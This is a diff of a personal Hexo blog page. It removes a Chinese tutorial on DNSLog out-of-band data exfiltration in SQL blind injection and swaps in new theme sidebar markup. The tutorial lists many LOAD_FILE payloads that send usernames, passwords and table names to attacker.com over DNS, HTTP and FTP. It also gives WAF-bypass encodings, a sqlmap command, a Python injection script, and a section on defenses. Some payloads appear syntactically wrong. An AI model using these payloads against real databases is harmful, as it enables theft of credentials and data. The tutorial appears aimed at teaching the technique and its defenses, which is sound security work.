-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取用户名</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取密码</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> users), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 组合获取</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-4-场景四：绕过过滤"><a href="#4-4-场景四：绕过过滤" class="headerlink" title="4.4 场景四：绕过过滤"></a>4.4 场景四：绕过过滤</h3><p>当直接使用LOAD_FILE被过滤时，可以使用以下方法：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 使用十六进制编码</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="number">0x5c5c5c5c7c2853454c4543542064617461626173652829292e61747461636b65722e636f6d5c61</span>);</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 使用concat函数分割</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\&#x27;</span>,(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> database()),<span class="number">1</span>,<span class="number">10</span>)),<span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h2><h3 id="5-1-数据库层面防护"><a href="#5-1-数据库层面防护" class="headerlink" title="5.1 数据库层面防护"></a>5.1 数据库层面防护</h3><ol>
-<li><p><strong>限制LOAD_FILE权限</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> MySQL中撤销LOAD_FILE权限</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> mysql.func <span class="keyword">FROM</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;host&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 限制文件访问目录</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> secure_file_priv <span class="operator">=</span> <span class="string">&#x27;/path/to/allowed/directory&#x27;</span>;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>禁用危险函数</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> PostgreSQL禁除危险扩展</span><br><span class="line"><span class="keyword">DROP</span> EXTENSION dblink;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> <span class="keyword">SQL</span> Server禁用xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>最小权限原则</strong></p>
-<ul>
-<li>应用数据库使用低权限账号</li>
-<li>限制对information_schema表的访问</li>
-</ul>
-</li>
-</ol>
-<h3 id="5-2-WAF-IPS防护"><a href="#5-2-WAF-IPS防护" class="headerlink" title="5.2 WAF&#x2F;IPS防护"></a>5.2 WAF&#x2F;IPS防护</h3><ol>
-<li><p><strong>特征检测规则</strong></p>
-<ul>
-<li>检测<code>LOAD_FILE</code>、<code>\\\\</code>、concat函数等特征</li>
-<li>监控DNS请求模式</li>
-</ul>
-</li>
-<li><p><strong>请求长度限制</strong></p>
-<ul>
-<li>限制HTTP请求长度</li>
-<li>限制单个参数的长度</li>
-</ul>
-</li>
-<li><p><strong>白名单机制</strong></p>
-<ul>
-<li>只允许特定的域名解析</li>
-<li>使用内部DNS服务器</li>
-</ul>
-</li>
-</ol>
-<h3 id="5-3-网络层面防护"><a href="#5-3-网络层面防护" class="headerlink" title="5.3 网络层面防护"></a>5.3 网络层面防护</h3><ol>
-<li><p><strong>DNS防护</strong></p>
-<ul>
-<li>部署DNS防火墙</li>
-<li>监控异常DNS查询</li>
-<li>限制外部DNS查询</li>
-</ul>
-</li>
-<li><p><strong>网络隔离</strong></p>
-<ul>
-<li>数据库服务器不允许对外部DNS查询</li>
-<li>使用代理服务器统一处理DNS请求</li>
-</ul>
-</li>
-</ol>
-<h3 id="5-4-日志监控"><a href="#5-4-日志监控" class="headerlink" title="5.4 日志监控"></a>5.4 日志监控</h3><ol>
-<li><p><strong>数据库审计日志</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> MySQL启用审计日志</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> audit_log_format <span class="operator">=</span> <span class="string">&#x27;JSON&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> audit_log_policy <span class="operator">=</span> <span class="string">&#x27;ALL&#x27;</span>;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>应用访问日志</strong></p>
-<ul>
-<li>记录所有SQL查询</li>
-<li>监控异常的DNS请求</li>
-</ul>
-</li>
-<li><p><strong>DNS查询日志</strong></p>
-<ul>
-<li>记录所有DNS查询</li>
-<li>分析查询模式</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="6-高级技巧与绕过"><a href="#6-高级技巧与绕过" class="headerlink" title="6. 高级技巧与绕过"></a>6. 高级技巧与绕过</h2><h3 id="6-1-绕过WAF检测"><a href="#6-1-绕过WAF检测" class="headerlink" title="6.1 绕过WAF检测"></a>6.1 绕过WAF检测</h3><h4 id="6-1-1-字符编码绕过"><a href="#6-1-1-字符编码绕过" class="headerlink" title="6.1.1 字符编码绕过"></a>6.1.1 字符编码绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> URL编码</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="operator">%</span><span class="number">5</span>C<span class="operator">%</span><span class="number">5</span>C<span class="operator">%</span><span class="number">5</span>C<span class="operator">%</span><span class="number">5</span>C(<span class="keyword">SELECT</span>(database()))<span class="operator">%</span><span class="number">2</span>Eattacker<span class="operator">%</span><span class="number">2</span>Ecom<span class="operator">%</span><span class="number">5</span>Ca)</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> Unicode编码</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(\\\\(<span class="keyword">SELECT</span>(database())).attacker.com\a)</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 十六进制编码</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="number">0x5C5C5C5C2853454C4543542064617461626173652829292E61747461636B65722E636F6D5C61</span>)</span><br></pre></td></tr></table></figure>
-
-<h4 id="6-1-2-函数混淆"><a href="#6-1-2-函数混淆" class="headerlink" title="6.1.2 函数混淆"></a>6.1.2 函数混淆</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 使用变量</span><br><span class="line"><span class="variable">@a</span><span class="operator">=</span>(<span class="keyword">SELECT</span> database());</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, <span class="variable">@a</span>, <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 使用<span class="keyword">case</span>语句</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">then</span> database() <span class="keyword">else</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">end</span>), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 使用子查询</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> database() <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-2-数据分割传输"><a href="#6-2-数据分割传输" class="headerlink" title="6.2 数据分割传输"></a>6.2 数据分割传输</h3><p>对于大量数据，可以分段传输：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取表名并分段</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(</span><br><span class="line">    concat(</span><br><span class="line">        <span class="string">&#x27;\\\\&#x27;</span>,</span><br><span class="line">        (<span class="keyword">select</span> <span class="built_in">substring</span>(group_concat(table_name),<span class="number">1</span>,<span class="number">30</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),</span><br><span class="line">        <span class="string">&#x27;.attacker.com\\a&#x27;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(</span><br><span class="line">    concat(</span><br><span class="line">        <span class="string">&#x27;\\\\&#x27;</span>,</span><br><span class="line">        (<span class="keyword">select</span> <span class="built_in">substring</span>(group_concat(table_name),<span class="number">31</span>,<span class="number">30</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),</span><br><span class="line">        <span class="string">&#x27;.attacker.com\\a&#x27;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-3-使用其他协议"><a href="#6-3-使用其他协议" class="headerlink" title="6.3 使用其他协议"></a>6.3 使用其他协议</h3><p>除了DNS，还可以使用其他协议外带数据：</p>
-<h4 id="6-3-1-HTTP协议"><a href="#6-3-1-HTTP协议" class="headerlink" title="6.3.1 HTTP协议"></a>6.3.1 HTTP协议</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> MySQL <span class="number">5.6</span><span class="operator">+</span>支持</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;http://attacker.com/&#x27;</span> <span class="operator">+</span> (<span class="keyword">SELECT</span> database()));</span><br></pre></td></tr></table></figure>
-
-<h4 id="6-3-2-FTP协议"><a href="#6-3-2-FTP协议" class="headerlink" title="6.3.2 FTP协议"></a>6.3.2 FTP协议</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 触发FTP请求</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;ftp://user:pass@attacker.com/&#x27;</span> <span class="operator">+</span> (<span class="keyword">SELECT</span> database()) <span class="operator">+</span> <span class="string">&#x27;.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-4-时间盲注配合DNSLog"><a href="#6-4-时间盲注配合DNSLog" class="headerlink" title="6.4 时间盲注配合DNSLog"></a>6.4 时间盲注配合DNSLog</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 使用sleep函数结合DNS</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, </span><br><span class="line">    (if((<span class="keyword">select</span> database() <span class="keyword">like</span> <span class="string">&#x27;%test%&#x27;</span>), <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)), </span><br><span class="line">    <span class="string">&#x27;.attacker.com\\a&#x27;</span>)) </span><br><span class="line"><span class="keyword">WHERE</span> sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="7-工具推荐"><a href="#7-工具推荐" class="headerlink" title="7. 工具推荐"></a>7. 工具推荐</h2><h3 id="7-1-DNSLog平台"><a href="#7-1-DNSLog平台" class="headerlink" title="7.1 DNSLog平台"></a>7.1 DNSLog平台</h3><ol>
-<li><p><strong>国内DNSLog平台</strong></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></li>
-<li><a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></li>
-<li><a target="_blank" rel="noopener" href="http://requestbin.net/">http://requestbin.net/</a></li>
-</ul>
-</li>
-<li><p><strong>自建DNSLog平台</strong></p>
-<ul>
-<li>DnsLog: <a target="_blank" rel="noopener" href="https://github.com/bishopfox/dnslog">https://github.com/bishopfox/dnslog</a></li>
-<li>DnslogServer: <a target="_blank" rel="noopener" href="https://github.com/log">https://github.com/log</a> AnyObject&#x2F;DnslogServer</li>
-</ul>
-</li>
-</ol>
-<h3 id="7-2-SQL注入工具"><a href="#7-2-SQL注入工具" class="headerlink" title="7.2 SQL注入工具"></a>7.2 SQL注入工具</h3><ol>
-<li><p><strong>SQLMap</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用DNSLog外带</span></span><br><span class="line">sqlmap *u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> **dns*domain=attacker.com</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>Burp Suite</strong></p>
-<ul>
-<li>使用Intruder模块</li>
-<li>配置DNSLog监听</li>
-</ul>
-</li>
-<li><p><strong>GoBuster</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DNS爆破</span></span><br><span class="line">gobuster dns *d example.com *w wordlist.txt</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="7-3-监控工具"><a href="#7-3-监控工具" class="headerlink" title="7.3 监控工具"></a>7.3 监控工具</h3><ol>
-<li><p><strong>Dig命令</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监控DNS查询</span></span><br><span class="line">dig @8.8.8.8 example.com AXFR</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>Nmap脚本</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用NSE脚本</span></span><br><span class="line">nmap **script dns*brute example.com</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>Wireshark</strong></p>
-<ul>
-<li>捕获DNS流量</li>
-<li>分析DNS查询</li>
-</ul>
-</li>
-</ol>
-<h3 id="7-4-Python脚本示例"><a href="#7-4-Python脚本示例" class="headerlink" title="7.4 Python脚本示例"></a>7.4 Python脚本示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"></span><br><span class="line"><span class="comment"># DNSLog平台配置</span></span><br><span class="line">DNSLOG_DOMAIN = <span class="string">&quot;ceye.io&quot;</span></span><br><span class="line">RESULT_DOMAIN = <span class="string">&quot;dns.ceye.io&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送注入请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_sql</span>(<span class="params">payload</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://target.com/page.php?id=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> response.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查DNSLog</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_dnslog</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        answers = dns.resolver.resolve(RESULT_DOMAIN, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> rdata <span class="keyword">in</span> answers:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] DNSLog Result: <span class="subst">&#123;rdata&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] No DNSLog result yet&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 获取数据库名</span></span><br><span class="line">    payload = <span class="string">&quot;SELECT LOAD_FILE(concat(&#x27;\\\\&#x27;,(SELECT database()),&#x27;.attacker.com\\a&#x27;))&quot;</span></span><br><span class="line">    inject_sql(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待DNS查询</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    check_dnslog()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DNSLog外带技术是一种隐蔽的数据提取方式，特别适用于SQL盲注场景。其核心原理是利用DNS查询机制将数据外带到攻击者控制的DNS服务器上。虽然这种技术可以绕过一些安全检测，但通过合理的权限控制、WAF规则配置和日志监控可以有效防御。在实际应用中，应该遵循最小权限原则，及时修补安全漏洞，并加强对异常行为的监控。</p>
-
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://g1s2y3.github.io/2026/04/24/DNSLog%E5%A4%96%E5%B8%A6%E5%8E%9F%E7%90%86%E5%8F%8ASQL%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/" data-id="cmojt40hv0001mwc5f2j76w9i" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2024/01/">
+            <span class="card-archive-list-date">
+              一月 2024
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
       
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/01/01/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2023-12-31T16:00:00.000Z" itemprop="datePublished">2024-01-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/01/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to my blog! This is my first post using Hexo and Fluid theme.</p>
-<h2 id="About-this-blog"><a href="#About-this-blog" class="headerlink" title="About this blog"></a>About this blog</h2><p>This is a personal blog where I’ll share my thoughts, experiences, and technical knowledge. I’m excited to start this journey and hope you’ll find something interesting here.</p>
-<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
-<li>Beautiful and responsive design</li>
-<li>Dark mode support</li>
-<li>Reading progress indicator</li>
-<li>Code highlighting</li>
-<li>Image lightbox</li>
-<li>Math formula support</li>
-<li>And many more!</li>
-</ul>
-<h2 id="Getting-started"><a href="#Getting-started" class="headerlink" title="Getting started"></a>Getting started</h2><p>To create a new post, run:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;Your Post Title&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>To start the development server:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
-
-<p>Happy blogging! 🎉</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://g1s2y3.github.io/2024/01/01/hello-world/" data-id="cmojt40i10003mwc54tuqasad" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hello/" rel="tag">Hello</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/World/" rel="tag">World</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">分类</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hello/" rel="tag">Hello</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/World/" rel="tag">World</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Hello/" style="font-size: 10px;">Hello</a> <a href="/tags/World/" style="font-size: 10px;">World</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/04/">四月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">一月 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2026/04/24/DNSLog%E5%A4%96%E5%B8%A6%E5%8E%9F%E7%90%86%E5%8F%8ASQL%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2024/01/01/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2026 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">2</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-04-29T09:34:15.279Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By John Doe</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
